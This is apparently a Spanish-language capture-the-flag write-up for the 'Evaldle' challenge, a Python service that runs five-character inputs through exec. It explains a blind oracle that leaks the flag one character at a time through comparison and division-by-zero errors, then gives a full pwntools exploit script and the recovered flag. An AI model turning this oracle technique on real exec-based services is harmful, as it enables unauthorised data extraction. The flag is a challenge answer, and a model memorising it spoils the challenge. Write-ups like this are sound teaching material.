# Evaldle

"eval" + "wordle"

La funcion `exec` ejecuta el codigo python que se le pase, si es una string

Nuestra entrada es de solo 5 caracteres, recibimos 🟩🟩🟩🟩🟩 si le pasamos un codigo correcto o 🟥🟥🟥🟥🟥 si ocurre algun error

Podemos crear variables dentro de exec y manipular las existentes, con estas podemos recuperar cada caracter de la flag con el siguiente algoritmo:

1- Inicializamos la variable `a` en '', esta sera nuetra preflag

2- Asignamos un caracter a la variable `b` de un alfabeto

3- Hacemos `c=a+b`, esto es la preflag + el caracter de prueba

4- Hacemos `d=f>c`, esto compara el ultimo caracter de la preflag con el correspondiente en la flag, si el de la flag es lexicograficamente mayor devuelve 1, sino devuelve 0

5- Probamos `1/d`, esto genera un error si d es falso por la division entre 0

6- Repetimos 2-5 con un caracter diferente del alfabeto hasta que 4 sea verdadero, entonces hacemos `a+=p`, siendo p el caracter anterior a `b`
Porque d=f>c es verdadero cuando f<c, entonces el caracter anterior es el correcto en la flag

7- Repetimos 2-6 hasta que el ultimo previo a `b` sea `}`, el fin de la flag

Exploit:
``` python
from pwn import *

alphabet = b"!#$%&'()*+,-./0123456789:;<=>@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"

flag = b""

#io = process(["python3","evaldle.py"])
io = remote("challs.umdctf.io",31601) 
def guess(payload):
    io.readuntil(b"Guess: ")
    io.sendline(payload)
    io.readline()
    res = io.readline().decode("utf-8")
    return "🟩" in res

def has_letter(letter):
    guess(b"b='" + letter + b"'")
    guess(b"c=a+b")
    guess(b"d=f>c")
    res = guess(b"1/d  ")
    # Porque res es True si el caracter de f es mayor a letter
    # Lo que significa que no se ha llegado al correcto
    return not res

guess(b"a='' ")
while b"}" not in flag:
    prev = None
    for c in alphabet:
        if has_letter(bytes((c,))):
            flag += prev
            print(flag)
            guess(b"b='" + prev + b"'")
            guess(b"a+=b ")
            break
        prev = bytes((c,))


io.interactive()
```

`UMDCTF{that_took_a_lot_more_than_six_guesses}`
